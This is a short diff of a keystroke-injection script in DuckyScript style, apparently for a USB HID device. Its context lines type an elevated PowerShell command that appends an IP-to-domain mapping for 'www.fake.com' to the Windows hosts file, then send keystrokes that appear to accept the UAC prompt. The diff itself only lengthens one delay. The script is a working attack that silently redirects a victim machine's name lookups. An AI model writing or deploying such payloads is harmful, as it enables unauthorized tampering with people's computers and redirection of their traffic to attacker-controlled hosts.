@@ -12,7 +12,7 @@ DELAY 400
 STRING powershell -Command "Start-Process cmd -Verb runAs -ArgumentList '/c echo 101.99.74.214    www.fake.com >> C:\Windows\System32\drivers\etc\hosts'"
 DELAY 400
 ENTER
-DELAY 400
+DELAY 1500
 LEFTARROW
 DELAY 400
 ENTER
